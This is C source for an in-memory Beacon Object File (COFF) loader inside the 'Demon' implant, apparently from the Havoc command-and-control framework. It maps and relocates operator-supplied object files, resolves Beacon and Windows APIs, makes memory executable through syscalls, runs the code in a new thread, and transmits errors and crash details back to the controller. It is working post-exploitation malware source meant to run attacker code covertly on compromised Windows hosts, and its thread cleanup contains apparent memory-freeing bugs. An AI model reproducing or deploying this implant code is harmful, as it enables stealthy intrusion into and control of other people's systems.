
#include <Demon.h>

#include <Core/WinUtils.h>
#include "Common/Defines.h"
#include <Core/MiniStd.h>
#include <Core/Package.h>
#include "Common/Macros.h"
#include <Core/Parser.h>

#include <Inject/InjectUtil.h>

#include <Loader/CoffeeLdr.h>
#include <Loader/ObjectApi.h>

#if defined( __x86_64__ ) || defined( _WIN64 )
    #define COFF_PREP_SYMBOL        0xec6ba2a8
    #define COFF_PREP_SYMBOL_SIZE   6

    #define COFF_PREP_BEACON        0xd0a409b0
    #define COFF_PREP_BEACON_SIZE   ( COFF_PREP_SYMBOL_SIZE + 6 )
#endif

PVOID CoffeeFunctionReturn = NULL;

LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )
{
    PRINTF( "Exception: %p\n", Exception->ExceptionRecord->ExceptionCode )

    // Leave faulty function
    Exception->ContextRecord->Rip = CoffeeFunctionReturn;

    PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
    PackageAddInt32( Package, 0x98 );
    PackageAddInt32( Package, Exception->ExceptionRecord->ExceptionCode );
    PackageAddInt64( Package, Exception->ExceptionRecord->ExceptionAddress );
    PackageTransmit( Package, NULL, NULL );

    return EXCEPTION_CONTINUE_EXECUTION;
}

PVOID CoffeeProcessSymbol( LPSTR Symbol )
{
    CHAR        Bak[ 1024 ] = { 0 };
    PVOID       FuncAddr    = NULL;
    PCHAR       SymLibrary  = NULL;
    PCHAR       SymFunction = NULL;
    HMODULE     hLibrary    = NULL;
    DWORD       SymHash     = HashEx( Symbol + COFF_PREP_SYMBOL_SIZE, 0, FALSE );
    DWORD       SymBeacon   = HashEx( Symbol, COFF_PREP_BEACON_SIZE, FALSE );
    ANSI_STRING AnsiString  = { 0 };
    PPACKAGE    Package     = NULL;

    PRINTF(
        "Symbol:         \n"
        " - String: %s   \n"
        " - Hash  : %lx  \n",
        Symbol, SymHash
    )

    MemCopy( Bak, Symbol, StringLengthA( Symbol ) + 1 );

    if ( SymBeacon == COFF_PREP_BEACON         || // check if this is a Beacon api
         SymHash   == COFFAPI_TOWIDECHAR       ||
         SymHash   == COFFAPI_GETPROCADDRESS   ||
         SymHash   == COFFAPI_LOADLIBRARYA     ||
         SymHash   == COFFAPI_GETMODULEHANDLE  ||
         SymHash   == COFFAPI_FREELIBRARY      )
    {
        PUTS( "Internal Function" )
        SymFunction = Symbol + COFF_PREP_SYMBOL_SIZE;

        for ( DWORD i = 0 ;; i++ )
        {
            if ( ! BeaconApi[ i ].NameHash )
                break;

            if ( HashStringA( SymFunction ) == BeaconApi[ i ].NameHash )
            {
                PUTS( "Found Beacon api function" )
                return BeaconApi[ i ].Pointer;
            }
        }

        goto SymbolNotFound;
    }
    else if ( HashEx( Symbol, COFF_PREP_SYMBOL_SIZE, FALSE ) == COFF_PREP_SYMBOL )
    {
        PUTS( "External Function" )
        SymLibrary  = Bak + COFF_PREP_SYMBOL_SIZE;
        SymLibrary  = StringTokenA( SymLibrary, "$" );
        SymFunction = SymLibrary + StringLengthA( SymLibrary ) + 1;
        hLibrary    = LdrModuleLoad( SymLibrary );

        if ( ! hLibrary )
        {
            PRINTF( "Failed to load library: Lib:[%s] Err:[%d]\n", SymLibrary, GetLastError() );
            goto SymbolNotFound;
        }

        AnsiString.Length        = StringLengthA( SymFunction );
        AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
        AnsiString.Buffer        = SymFunction;

        if ( ! NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, &FuncAddr ) ) )
            goto SymbolNotFound;
    }
    else
    {
        PUTS( "Unknown Function" )
        PRINTF( "Can't handle this function: %s\n", Symbol );
        goto SymbolNotFound;
    }

    return FuncAddr;

SymbolNotFound:
    Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
    PackageAddInt32( Package, 0x99 );
    PackageAddBytes( Package, Symbol, StringLengthA( Symbol ) );
    PackageTransmit( Package, NULL, NULL );

    return FuncAddr;
}

// This is our function where we can control/get the return address of it to use it in case of a Veh exception
VOID CoffeeFunction( PVOID Address, PVOID Argument, SIZE_T Size )
{
    VOID ( *Function ) ( PCHAR , ULONG ) = Address;

    CoffeeFunctionReturn = __builtin_extract_return_addr( __builtin_return_address ( 0 ) );

    // Execute our function
    Function( Argument, Size );

    PUTS( "Finished" )
}

BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE_T Size )
{
    PVOID CoffeeMain = NULL;
    PVOID VehHandle  = NULL;
    BOOL  Success    = FALSE;

    if ( Instance.Config.Implant.CoffeeVeh )
    {
        PUTS( "Register VEH handler..." )
        // Add Veh Debugger in case that our BOF crashes etc.
        VehHandle = Instance.Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
        if ( ! VehHandle )
        {
            CALLBACK_GETLASTERROR
            return FALSE;
        }
    }

    for ( DWORD SymCounter = 0; SymCounter < Coffee->Header->NumberOfSymbols; SymCounter++ )
    {
        if ( StringCompareA( Coffee->Symbol[ SymCounter ].First.Name, Function ) == 0 )
        {
            Success = TRUE;

            // set the .text section to RX
            MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->SecMap[ 0 ].Ptr, Coffee->SecMap[ 0 ].Size, PAGE_EXECUTE_READ );

            CoffeeMain = ( Coffee->SecMap[ Coffee->Symbol[ SymCounter ].SectionNumber - 1 ].Ptr + Coffee->Symbol[ SymCounter ].Value );
            CoffeeFunction( CoffeeMain, Argument, Size );

            // Remove our exception handler
            Instance.Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
        }
    }

    if ( ! Success )
    {
        PRINTF( "[!] Couldn't find function => %s\n", Function );
        PRINTF( "Function => %s [%d]\n", Function, StringLengthA( Function ) );

        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );

        PackageAddInt32( Package, 0x99 );
        PackageAddBytes( Package, Function, StringLengthA( Function ) );
        PackageTransmit( Package, NULL, NULL );
    }

    return Success;
}

BOOL CoffeeCleanup( PCOFFEE Coffee )
{
    PVOID    Pointer  = NULL;
    SIZE_T   Size     = 0;
    NTSTATUS NtStatus = 0;

    for ( DWORD SecCnt = 0; SecCnt < Coffee->Header->NumberOfSections; SecCnt++ )
    {
        if ( Coffee->SecMap[ SecCnt ].Ptr )
        {
            if ( ! MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->SecMap[ SecCnt ].Ptr, Coffee->SecMap[ SecCnt ].Size, PAGE_READWRITE ) )
            {
                PUTS( "[!] Failed to change protection to RW" );
                return FALSE;
            }

            MemSet( Coffee->SecMap[ SecCnt ].Ptr, 0, Coffee->SecMap[ SecCnt ].Size );

            Size    = 0;
            Pointer = Coffee->SecMap[ SecCnt ].Ptr;
            if ( ! NT_SUCCESS( ( NtStatus = Instance.Syscall.NtFreeVirtualMemory( NtCurrentProcess(), &Pointer, &Size, MEM_RELEASE ) ) ) )
            {
                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                PRINTF( "[!] Failed to free memory: %p : %lu\n", Coffee->SecMap[ SecCnt ].Ptr, NtGetLastError() );
            }

            Coffee->SecMap[ SecCnt ].Ptr = NULL;
        }
    }

    if ( Coffee->SecMap )
    {
        MemSet( Coffee->SecMap, 0, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
        Instance.Win32.LocalFree( Coffee->SecMap );
        Coffee->SecMap = NULL;
    }

    if ( Coffee->FunMap )
    {
        MemSet( Coffee->FunMap, 0, 2048 );
        Instance.Win32.LocalFree( Coffee->FunMap );
        Coffee->FunMap = NULL;
    }
}

// Process sections relocation and symbols
BOOL CoffeeProcessSections( PCOFFEE Coffee )
{
    PUTS( "Process Sections" )
    UINT32 Symbol     = 0;
    PVOID  SymString  = NULL;
    PCHAR  FuncPtr    = NULL;
    DWORD  FuncCount  = 0;
    UINT64 OffsetLong = 0;
    UINT32 Offset     = 0;

    for ( DWORD SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt );
        Coffee->Reloc   = U_PTR( Coffee->Data ) + Coffee->Section->PointerToRelocations;

        for ( DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++ )
        {
            if ( Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Name[ 0 ] != 0 )
            {
                Symbol = C_PTR( Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 1 ] );

                if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64 )
                {
                    MemCopy( &OffsetLong, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT64 ) );

                    OffsetLong = ( UINT64 ) ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + ( UINT64 ) OffsetLong );

                    MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &OffsetLong, sizeof( UINT64 ) );
                }
                else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR32NB )
                {
                    MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                    if ( ( ( PCHAR ) ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( PCHAR ) ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + 4 ) ) > 0xffffffff )
                        return FALSE;

                    Offset = ( UINT32 ) ( ( PCHAR ) ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( PCHAR ) ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + 4 ) );

                    MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
                }
                else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 )
                {
                    MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                    if ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + 4 ) ) > 0xffffffff )
                        return FALSE;

                    Offset += ( UINT32 ) ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + 4 ) );

                    MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
                }
                else
                    PRINTF( "[!] Relocation type not found: %d\n", Coffee->Reloc->Type );

            }
            else
            {
                Symbol    = Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 1 ];
                SymString = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Symbol;
                FuncPtr   = CoffeeProcessSymbol( SymString );

                if ( ! FuncPtr )
                {
                    PUTS( "FunctionPtr is empty: couldn't be resolved" );
                    return FALSE;
                }

                if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr != NULL )
                {
                    if ( ( ( Coffee->FunMap + ( FuncCount * 8 ) ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + 4 ) ) > 0xffffffff )
                        return FALSE;

                    MemCopy( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ), &FuncPtr, sizeof( UINT64 ) );

                    Offset = ( UINT32 ) ( ( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ) ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + 4 ) );
                    MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );

                    FuncCount++;
                }
                else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 )
                {
                    MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                    if ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + 4 ) ) > 0xffffffff )
                        return FALSE;

                    Offset += ( UINT32 ) ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + 4 ) );

                    MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
                }
                else
                    PRINTF( "[!] Relocation type not found: %d\n", Coffee->Reloc->Type );

            }

            Coffee->Reloc = U_PTR( Coffee->Reloc ) + sizeof( COFF_RELOC );
        }
    }

    return TRUE;
}

DWORD CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize )
{
    COFFEE Coffee = { 0 };

    PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData, ArgData, ArgSize )

    if ( ! CoffeeData )
    {
        PUTS( "[!] Coffee data is empty" );
        return 1;
    }

    Coffee.Data   = CoffeeData;
    Coffee.Header = Coffee.Data;

    Coffee.SecMap = Instance.Win32.LocalAlloc( LPTR, Coffee.Header->NumberOfSections * sizeof( SECTION_MAP ) );
    Coffee.FunMap = Instance.Win32.LocalAlloc( LPTR, 2048 );

    PRINTF( "Coffee.SecMap => %p\n", Coffee.SecMap )
    PRINTF( "Coffee.FunMap => %p\n", Coffee.FunMap )

    for ( DWORD SecCnt = 0 ; SecCnt < Coffee.Header->NumberOfSections; SecCnt++ )
    {
        Coffee.Section               = U_PTR( Coffee.Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt );
        Coffee.SecMap[ SecCnt ].Size = Coffee.Section->SizeOfRawData;
        Coffee.SecMap[ SecCnt ].Ptr  = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Coffee.SecMap[ SecCnt ].Size, PAGE_READWRITE );

        PRINTF( "Coffee.SecMap[ %d ].Ptr => %p\n", SecCnt, Coffee.SecMap[ SecCnt ].Ptr )

        MemCopy( Coffee.SecMap[ SecCnt ].Ptr, U_PTR( CoffeeData ) + Coffee.Section->PointerToRawData, Coffee.Section->SizeOfRawData );
    }

    Coffee.Symbol = U_PTR( Coffee.Data ) + Coffee.Header->PointerToSymbolTable;
    if ( ! CoffeeProcessSections( &Coffee ) )
    {
        PUTS( "[*] Failed to process relocation" );
        return 1;
    }

    PUTS( "[*] Execute coffee main\n" );
    CoffeeExecuteFunction( &Coffee, EntryName, ArgData, ArgSize );

    PUTS( "[*] Cleanup memory" );
    CoffeeCleanup( &Coffee );

    return 0;
}

VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
{
    DWORD Status = 0;

    if ( ! Param->EntryName || ! Param->CoffeeData )
        goto ExitThread;

    Status = CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize );
    if ( Status )
    {
        PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
    }

ExitThread:
    if ( Param->EntryName )
    {
        MemSet( Param->EntryName, 0, Param->EntryNameSize );
        Instance.Win32.LocalFree( Param->EntryName );
        Param->EntryName = NULL;
    }

    if ( Param->CoffeeData )
    {
        MemSet( Param->EntryName, 0, Param->EntryNameSize );
        Instance.Win32.LocalFree( Param->EntryName );
        Param->EntryName = NULL;
    }

    if ( Param->ArgData )
    {
        MemSet( Param->EntryName, 0, Param->EntryNameSize );
        Instance.Win32.LocalFree( Param->EntryName );
        Param->EntryName = NULL;
    }

    if ( Param )
    {
        MemSet( Param, 0, sizeof( COFFEE_PARAMS ) );
        Instance.Win32.LocalFree( Param );
        Param = NULL;
    }

    JobRemove( NtCurrentTeb()->ClientId.UniqueThread );
    Instance.Threads--;

    Instance.Win32.RtlExitUserThread( 0 );
}

VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize )
{
    PCOFFEE_PARAMS CoffeeParams = NULL;
    INJECTION_CTX  InjectionCtx = { 0 };

    // Allocate memory
    CoffeeParams                 = Instance.Win32.LocalAlloc( LPTR, sizeof( COFFEE_PARAMS ) );
    CoffeeParams->EntryName      = Instance.Win32.LocalAlloc( LPTR, EntryNameSize );
    CoffeeParams->CoffeeData     = Instance.Win32.LocalAlloc( LPTR, CoffeeDataSize );
    CoffeeParams->ArgData        = Instance.Win32.LocalAlloc( LPTR, ArgSize );
    CoffeeParams->EntryNameSize  = EntryNameSize;
    CoffeeParams->CoffeeDataSize = CoffeeDataSize;
    CoffeeParams->ArgSize        = ArgSize;

    MemCopy( CoffeeParams->EntryName,  EntryName,  EntryNameSize  );
    MemCopy( CoffeeParams->CoffeeData, CoffeeData, CoffeeDataSize );
    MemCopy( CoffeeParams->ArgData,    ArgData,    ArgSize        );

    InjectionCtx.Parameter = CoffeeParams;

    Instance.Threads++;

    if ( ! ThreadCreate( DX_THREAD_SYSCALL, NtCurrentProcess(), CoffeeRunnerThread, &InjectionCtx ) )
    {
        PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
        CALLBACK_GETLASTERROR
    }
}